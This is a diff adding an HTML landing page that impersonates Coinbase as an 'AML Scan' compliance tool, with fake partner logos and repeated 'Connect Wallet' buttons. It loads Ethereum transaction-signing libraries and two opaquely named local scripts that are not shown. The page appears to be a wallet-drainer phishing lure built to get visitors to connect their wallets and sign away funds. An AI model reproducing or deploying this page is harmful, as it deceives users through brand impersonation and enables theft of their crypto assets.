@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:type" name="og:type" content="website">
+  <!-- Metadata for SEO and social media -->
+  <meta name="description" content="Coinbase AML Scan is an advanced anti-money laundering scanning tool to ensure regulatory compliance in crypto transactions. Protect your assets today.">
+  <meta name="keywords" content="Coinbase, AML Scan, compliance, Anti-Money Laundering, cryptocurrency, crypto compliance, asset security">
+  <meta name="author" content="Coinbase AML Scan">
+  <meta property="og:title" content="Coinbase AML Scan - Secure Compliance for Crypto">
+  <meta property="og:description" content="Protect your assets and ensure regulatory compliance with our advanced AML scanning tool. Start securing your transactions today.">
+  <meta property="og:image" content="https://images.ctfassets.net/q5ulk4bp65r7/5sLdSqJroJ9WlaaMGDeGLv/4e145d71e8b25e8140306081e9ff667a/Learn_Illustration_What_is_Anti-Money_Laundering__AML_.jpg">
+  <meta property="og:url" content="#">
+  <meta name="twitter:card" content="https://images.ctfassets.net/q5ulk4bp65r7/5sLdSqJroJ9WlaaMGDeGLv/4e145d71e8b25e8140306081e9ff667a/Learn_Illustration_What_is_Anti-Money_Laundering__AML_.jpg">
+  <meta name="twitter:title" content="Coinbase AML Scan - Secure Compliance for Crypto">
+  <meta name="twitter:description" content="Protect your assets and ensure regulatory compliance with our advanced AML scanning tool.">
+  <meta name="twitter:image" content="https://images.ctfassets.net/q5ulk4bp65r7/5sLdSqJroJ9WlaaMGDeGLv/4e145d71e8b25e8140306081e9ff667a/Learn_Illustration_What_is_Anti-Money_Laundering__AML_.jpg">
+  <title>Coinbase AML Scan - Secure Compliance for Crypto</title>
+  <link rel="icon" type="image/x-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAMTSURBVHgBxVc9bNNAFH6umGDJArMzN1LTBcYkOxLpAiPtDmoqJEbasJWljsRM0pEuTSWY46wspFKZ8QxDvMBq3ue7M2fnzr4mlvpJT/473/vuvXfvvfPIEUmSNPjSZ+mwtFl8lob8HLNELAuWkOXK87yY6gAr9lkClmVyO4zxL60LrJjlLNkcZ9J6RngW5T5fZiTMnCH8QTS/EdfoN8sv8b7xgH3CI3eaRPs9cV9AxNJjt0SVBFg5/HupK4fC4WdxdUF3m+j4OV9bKyT2mMTCSqC48viPUBx8pbUweCqIwEIaiZwlPE05/PRdKYd59z5wWP+kjdBmt1y+5Ukf5Ujsql2ypY09Jm3ldSgHMAfmwpwSvtRFGQFp+oF6CbPXoVwnMbzIvRqoLepJAhO+vMT99BszPi2fED5FoKloX0QiQLVVGjEb5gJzxG4YeNL3S/V2942Y0IZDDqyTfGClQMxMQmE9G0B69j57RAw04YK+egNTlSkfv+IdcbCqHECQgRjG2AArhTfZY5raQaCr3pzP7D9jOyHJVAFjsP1smOdzSQcEdtSTbfVYsYtyhXTv3zd/KySz9j3SMp4t8uE7bR9XAoTHr81BWXCfDwJZoYj/mic05PZK9B87DWts0R0DFsB2SK0AM6sKp6NsZ9iAfGJzgWadGAQiEh0O+Q/NBFSSMW0/E9I6YklmiCeNQAQXXGcfW+af0qp4Qc44D+3fQEDDAgSy4Z1t+4/Bl/I8kSnnMScl2fDZk9xjCAJTEnGQsuuWkNj/KFKtyU2w0tEnMcYGvX5IXKliFPDlMKXE/u69o1LUVIwmXIwOFAFMlaWho7EweZ1AEUMd0dBEZ5TmAdkijdQXpNJ1ko8N6IpQqDSMVFtW3pKdrpcDisqLLRkrb6qHLBPKHg0lJ8IzfkDtLqtsVYDZ4fdCP5gra85tOSLc1RppW/5iZUdFVNWWayR8MhxMUC3R9VzLxkVFPVaILNppWbcyjzYfTKyQR7Mg2RxB2dHMhQgOp5PkdlhKxX7V/B45Ivl/PO+S6KJ8Mh/P5yxT1+P5Pz0KKcNHhU/1AAAAAElFTkSuQmCC">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;family=Montserrat:wght@400;500;700&amp;family=Raleway:wght@400;500;700&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
+  <script src="js/ethereumjs-tx-ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="js/5.7.2-ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/4.0.3-web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/2285--settings.js"></script>
+  <script src="js/1694--xgfcb4c8f5g.js" type="module"></script>
+  <style>
+   :root {
+    --primary-color: #0052FF;
+    --secondary-color: #050F19;
+    --background-color: #FAFBFC;
+    --text-color: #1E2026;
+    --light-gray: #E5E5E5;
+    --white: #FFFFFF;
+   }
+
+   * {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+   }
+
+   body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+    line-height: 1.6;
+    color: var(--text-color);
+    background-color: var(--background-color);
+   }
+
+   .container {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+   }
+
+   a {
+    text-decoration: none;
+    color: inherit;
+    transition: color 0.3s ease;
+   }
+
+   ul {
+    list-style: none;
+   }
+
+   /* Header styles */
+   header {
+    background-color: var(--white);
+    border-bottom: 5px solid light-gray;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+   }
+
+   nav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 0;
+   }
+
+   .logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: var(--primary-color);
+   }
+
+   .nav-links {
+    display: flex;
+    gap: 1.5rem;
+   }
+
+   .nav-links a {
+    font-weight: 500;
+    position: relative;
+   }
+
+   .nav-links a::after {
+    content: '';
+    position: absolute;
+    width: 0;
+    height: 2px;
+    bottom: -4px;
+    left: 0;
+    background-color: var(--primary-color);
+    transition: width 0.3s ease;
+   }
+
+   .nav-links a:hover::after {
+    width: 100%;
+   }
+
+   /* Hero section styles */
+   .hero {
+    background-color: var(--primary-color);
+    color: var(--white);
+    padding: 5rem 0;
+    text-align: center;
+   }
+
+   .hero h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    line-height: 1.2;
+   }
+
+   .hero p {
+    font-size: 1.25rem;
+    margin-bottom: 2rem;
+    max-width: 800px;
+    margin-left: auto;
+    margin-right: auto;
+   }
+
+   .cta-button {
+    display: inline-block;
+    background-color: var(--white);
+    color: var(--primary-color);
+    padding: 0.75rem 2rem;
+    border-radius: 50px;
+    font-weight: 600;
+    font-family: Inter;
+    font-size: 1.125rem;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+   }
+
+   .cta-button:hover {
+    background-color: var(--primary-color);
+    color: var(--white);
+    box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+   }
+
+   /* Partners section styles */
+   .partners {
+    padding: 5rem 0;
+    background-color: var(--white);
+   }
+
+   .partners h2 {
+    font-size: 2rem;
+    text-align: center;
+    margin-bottom: 3rem;
+   }
+
+   .partners-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 2rem;
+    max-width: 1000px;
+    margin: 0 auto;
+   }
+
+   .partner-card {
+    border: 2px solid var(--light-gray);
+    border-radius: 12px;
+    padding: 2rem;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    transition: all 0.3s ease;
+    background-color: var(--white);
+   }
+
+   .partner-card:hover {
+    border-color: var(--primary-color);
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+    transform: translateY(-5px);
+   }
+
+   .partner-icon {
+    width: 80px;
+    height: 80px;
+    margin-bottom: 1rem;
+    animation: float 3s ease-in-out infinite;
+   }
+
+   @keyframes float {
+
+    0%,
+    100% {
+     transform: translateY(0);
+    }
+
+    50% {
+     transform: translateY(-10px);
+    }
+   }
+
+   .partner-card span {
+    font-weight: 600;
+    color: var(--secondary-color);
+   }
+
+   /* Features section styles */
+   .features {
+    background-color: var(--background-color);
+    padding: 5rem 0;
+   }
+
+   .features h2 {
+    font-size: 2rem;
+    text-align: center;
+    margin-bottom: 3rem;
+   }
+
+   .features-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 2rem;
+   }
+
+   .feature-card {
+    background-color: var(--white);
+    padding: 2rem;
+    border-radius: 12px;
+    text-align: center;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    transition: all 0.3s ease;
+   }
+
+   .feature-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+   }
+
+   .feature-icon {
+    font-size: 3rem;
+    color: var(--primary-color);
+    margin-bottom: 1rem;
+   }
+
+   .feature-img {
+    width: 80px;
+    height: 80px;
+    margin-bottom: 1rem;
+    animation: float 3s ease-in-out infinite;
+   }
+
+   .feature-card h3 {
+    font-size: 1.25rem;
+    margin-bottom: 0.5rem;
+    color: var(--secondary-color);
+   }
+
+   /* Benefits section styles */
+   .benefits {
+    padding: 5rem 0;
+    background-color: var(--white);
+   }
+
+   .benefits h2 {
+    font-size: 2rem;
+    text-align: center;
+    margin-bottom: 3rem;
+   }
+
+   .benefits-list {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1.5rem;
+    max-width: 1000px;
+    margin: 0 auto;
+   }
+
+   .benefit-item {
+    display: flex;
+    align-items: flex-start;
+    background-color: var(--background-color);
+    padding: 1.5rem;
+    border-radius: 12px;
+    transition: all 0.3s ease;
+   }
+
+   .benefit-item:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+   }
+
+   .benefit-icon {
+    color: var(--primary-color);
+    font-size: 1.5rem;
+    margin-right: 1rem;
+    flex-shrink: 0;
+   }
+
+   .benefit-img {
+    height: 3rem;
+    margin-right: 1rem;
+    flex-shrink: 0;
+   }
+
+   /* CTA section styles */
+   .cta {
+    background-color: var(--primary-color);
+    color: var(--white);
+    padding: 5rem 0;
+    text-align: center;
+   }
+
+   .cta h2 {
+    font-size: 2rem;
+    margin-bottom: 1rem;
+   }
+
+   .cta p {
+    font-size: 1.25rem;
+    margin-bottom: 2rem;
+    max-width: 800px;
+    margin-left: auto;
+    margin-right: auto;
+   }
+
+   .cta-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 1rem;
+   }
+
+   .main-cta {
+    display: inline-block;
+    background-color: var(--white);
+    color: var(--primary-color);
+    padding: 0.75rem 2rem;
+    border-radius: 50px;
+    font-weight: 600;
+    cursor: pointer;
+    font-size: 1.125rem;
+    border: 2px solid var(--transparent);
+    transition: all 0.5s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+   }
+
+   .main-cta:hover {
+    background-color: transparent;
+    color: var(--white);
+   }
+
+   .first-cta {
+    display: inline-block;
+    background-color: var(--primary-color);
+    color: var(--white);
+    padding: 0.5rem 1rem;
+    border-radius: 50px;
+    font-weight: 600;
+    cursor: pointer;
+    border: 2px solid var(--primary-color);
+    font-size: 1rem;
+    transition: all 0.5s ease;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+   }
+
+   .first-cta:hover {
+    background-color: var(--white);
+    color: var(--primary-color);
+    border: 2px solid var(--primary-color);
+   }
+
+   .secondary-cta {
+    display: inline-block;
+    background-color: transparent;
+    color: var(--white);
+    padding: 0.75rem 2rem;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 1.125rem;
+    border: 2px solid var(--white);
+    transition: all 0.3s ease;
+   }
+
+   .secondary-cta:hover {
+    background-color: var(--white);
+    color: var(--primary-color);
+   }
+
+   /* Footer styles */
+   footer {
+    background-color: var(--secondary-color);
+    color: var(--white);
+    padding: 3rem 0;
+   }
+
+   .footer-content {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 2rem;
+   }
+
+   .footer-column h3 {
+    font-size: 1.25rem;
+    margin-bottom: 1rem;
+    color: var(--primary-color);
+   }
+
+   .footer-column ul {
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+   }
+
+   .footer-column a {
+    transition: color 0.3s ease;
+   }
+
+   .footer-column a:hover {
+    color: var(--primary-color);
+   }
+
+   .footer-bottom {
+    text-align: center;
+    margin-top: 3rem;
+    padding-top: 2rem;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+   }
+
+   /* Responsive adjustments */
+   @media (max-width: 768px) {
+    .hero h1 {
+     font-size: 2rem;
+    }
+
+    .hero p {
+     font-size: 1rem;
+    }
+
+    .cta-buttons {
+     flex-direction: column;
+     align-items: center;
+    }
+
+    .nav-links {
+     display: none;
+    }
+
+    .mobile-menu-toggle {
+     display: block;
+     font-size: 1.5rem;
+     background: none;
+     border: none;
+     color: var(--secondary-color);
+     cursor: pointer;
+    }
+   }
+
+   @media (min-width: 769px) {
+    .mobile-menu-toggle {
+     display: none;
+    }
+   }
+
+   /* Accessibility improvements */
+   .sr-only {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    padding: 0;
+    margin: -1px;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+    white-space: nowrap;
+    border-width: 0;
+   }
+
+   /* Focus styles for keyboard navigation */
+   a:focus,
+   button:focus {
+    outline: 2px solid var(--primary-color);
+    outline-offset: 2px;
+   }
+
+   /* Skip to main content link */
+   .skip-to-content {
+    position: absolute;
+    top: -40px;
+    left: 0;
+    background: var(--primary-color);
+    color: var(--white);
+    padding: 8px;
+    z-index: 100;
+   }
+
+   .skip-to-content:focus {
+    top: 0;
+   }
+  </style>
+ </head>
+ <body>
+  <header>
+   <div class="container">
+    <nav>
+     <a href="#" class="logo">
+      <img src="images/Coinbase.svg-2560px-Coinbase.svg.png" width="100" height="auto" alt="Coinbase Logo">
+     </a>
+     <button class="first-cta">Connect Wallet</button>
+    </nav>
+   </div>
+  </header>
+  <main id="main-content">
+   <section class="hero">
+    <div class="container">
+     <h1>Coinbase AML Scan: Secure Compliance for Crypto</h1>
+     <p>Protect your assets and ensure regulatory compliance with our advance Anti-Money Laundering (AML) scanning tool. Connect your wallet and start securing your transactions today.</p>
+     <button class="main-cta">Connect Wallet</button>
+    </div>
+   </section>
+   <section id="partners" class="partners">
+    <div class="container">
+     <h2>Our Trusted Partners</h2>
+     <div class="partners-grid">
+      <div class="partner-card">
+       <img src="images/metamask.png" alt="MetaMask" class="partner-icon">
+       <span>MetaMask</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/trezor.svg" alt="Trezor" class="partner-icon">
+       <span>Trezor</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/ledger.svg" alt="Ledger" class="partner-icon">
+       <span>Ledger</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/kraken.png" alt="Kraken" class="partner-icon">
+       <span>Kraken</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/exodus.svg" alt="Ledger" class="partner-icon">
+       <span>Exodus</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/binance.png" alt="Binance" class="partner-icon">
+       <span>Binance</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/ctc.png" alt="CTC" class="partner-icon">
+       <span>CryptoTaxCalculator</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/trust.png" alt="Trust" class="partner-icon">
+       <span>Trust Wallet</span>
+      </div>
+     </div>
+    </div>
+   </section>
+   <section id="features" class="features">
+    <div class="container">
+     <h2>Key Features of Coinbase AML Scan</h2>
+     <div class="features-grid">
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-passwordWalletLocked-2.svg">
+       </div>
+       <h3>Advanced AML Screening</h3>
+       <p>Utilize cutting-edge algorithms to screen transactions and detect suspicious activities.</p>
+      </div>
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-completeQuiz-3.svg">
+       </div>
+       <h3>Real-time Monitoring</h3>
+       <p>Monitor transactions in real-time to identify and flag potential risks instantly.</p>
+      </div>
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-globalPayments-3.svg">
+       </div>
+       <h3>Global Compliance</h3>
+       <p>Stay compliant with international AML regulations and standards across different jurisdictions.</p>
+      </div>
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-key-2.svg">
+       </div>
+       <h3>Secure and Private</h3>
+       <p>Ensure the highest level of security and privacy for all scanned data and results.</p>
+      </div>
+     </div>
+    </div>
+   </section>
+   <section id="benefits" class="benefits">
+    <div class="container">
+     <h2>Benefits of Using Coinbase AML Scan</h2>
+     <ul class="benefits-list">
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Reduce compliance risks and avoid penalties</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Streamline your AML processes and save time</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Enhance your reputation as a trusted crypto business</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Access detailed reports for auditing purposes</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Stay ahead of evolving regulatory requirements</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Protect your business from financial crimes</span>
+      </li>
+     </ul>
+    </div>
+   </section>
+   <section class="cta">
+    <div class="container">
+     <h2>Ready to Enhance Your AML Compliance?</h2>
+     <p>Join thousands of businesses that trust Coinbase for their AML compliance needs. Get started with our powerful AML scanning tool today.</p>
+     <div class="cta-buttons">
+      <button class="secondary-cta">Connect Wallet</button>
+     </div>
+    </div>
+   </section>
+  </main>
+  <footer>
+   <div class="container">
+    <div class="footer-content">
+     <div class="footer-column">
+      <h3>Products</h3>
+      <ul>
+       <li>
+        <a href="#">AML Scan</a>
+       </li>
+       <li>
+        <a href="#">Wallet</a>
+       </li>
+       <li>
+        <a href="#">Exchange</a>
+       </li>
+      </ul>
+     </div>
+     <div class="footer-column">
+      <h3>Learn</h3>
+      <ul>
+       <li>
+        <a href="#">Blog</a>
+       </li>
+       <li>
+        <a href="#">Crypto basics</a>
+       </li>
+       <li>
+        <a href="#">Market updates</a>
+       </li>
+      </ul>
+     </div>
+     <div class="footer-column">
+      <h3>Company</h3>
+      <ul>
+       <li>
+        <a href="#">About</a>
+       </li>
+       <li>
+        <a href="#">Careers</a>
+       </li>
+       <li>
+        <a href="#">Press</a>
+       </li>
+      </ul>
+     </div>
+     <div class="footer-column">
+      <h3>Social</h3>
+      <ul>
+       <li>
+        <a href="#">Twitter</a>
+       </li>
+       <li>
+        <a href="#">Facebook</a>
+       </li>
+       <li>
+        <a href="#">LinkedIn</a>
+       </li>
+      </ul>
+     </div>
+    </div>
+    <div class="footer-bottom">
+     <p>&copy; 2025 Coinbase. All rights reserved.</p>
+    </div>
+   </div>
+  </footer>
+  <script>
+   document.querySelector('.mobile-menu-toggle').addEventListener('click', function() {
+    document.querySelector('.nav-links').classList.toggle('active');
+   });
+  </script>
+ </body>
+</html>
